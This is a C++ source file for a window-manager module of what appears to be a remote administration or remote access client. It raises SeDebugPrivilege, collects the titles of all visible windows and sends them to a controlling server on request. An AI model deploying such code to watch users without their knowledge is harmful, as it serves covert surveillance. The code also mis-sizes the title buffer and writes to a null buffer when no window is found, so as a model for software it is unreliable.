#include "stdafx.h"

#include <tchar.h>

#include "WindowManager.h"



CWindowManager::CWindowManager(CIOCPClient *IOCPClient)
	:CManager(IOCPClient)
{
	_tprintf(_T("WindowManager is under Execution\r\n"));
	EnableSeDebugPrivilege(SE_DEBUG_NAME, TRUE);
	SendClientWindowList();
}

CWindowManager::~CWindowManager()
{
	_tprintf(_T("WindowManager Exit\r\n"));
	EnableSeDebugPrivilege(SE_DEBUG_NAME, FALSE);
}


void   CWindowManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{

	switch (BufferData[0])
	{
	case CLIENT_WINDOW_REFRESH_REQUIRE:
	{
		SendClientWindowList();
		break;
	}
	default:
		break;
	}
}

BOOL   CWindowManager::SendClientWindowList()
{
	LPBYTE BufferData = GetWindowList();
	if (BufferData == NULL)
	{
		return FALSE;
	}

	_M_IOCPClient->OnServerSending((char*)BufferData, LocalSize(BufferData));

	LocalFree(BufferData);

	return TRUE;
}

LPBYTE CWindowManager::GetWindowList()
{
	LPBYTE BufferData = NULL;

	EnumWindows((WNDENUMPROC)_EnumWindowProc, (LPARAM)&BufferData);

	BufferData[0] = CLIENT_WINDOW_MANAGER_REPLY;

	return BufferData;

}


BOOL   CWindowManager::_EnumWindowProc(HWND hWnd, LPARAM lParam)
{
	DWORD  BufferLength = 0;
	DWORD  offset     = 0;
	DWORD  ProcessID  = 0;
	LPBYTE BufferData = *(LPBYTE*)lParam;

	TCHAR TitleName[0x400];
	ZeroMemory(&TitleName, sizeof(TitleName));

	GetWindowText(hWnd, TitleName, sizeof(TitleName));

	if (!IsWindowVisible(hWnd) || _tcslen(TitleName) == 0) {
		return TRUE;
	}
	if (BufferData == NULL) {
		BufferData = (LPBYTE)LocalAlloc(LPTR, 1);
	}

	BufferLength = sizeof(HWND) + (_tcslen(TitleName) + 1) * sizeof(TCHAR);
	offset = LocalSize(BufferData);

	BufferData = (LPBYTE)LocalReAlloc(BufferData, offset + BufferLength, LMEM_ZEROINIT | LMEM_MOVEABLE);

	memcpy((BufferData + offset), &hWnd, sizeof(HWND));
	memcpy((BufferData + offset + sizeof(HWND)), TitleName, (_tcslen(TitleName) + 1) * sizeof(TCHAR));

	*(LPBYTE*)lParam = BufferData;

	return TRUE;

}
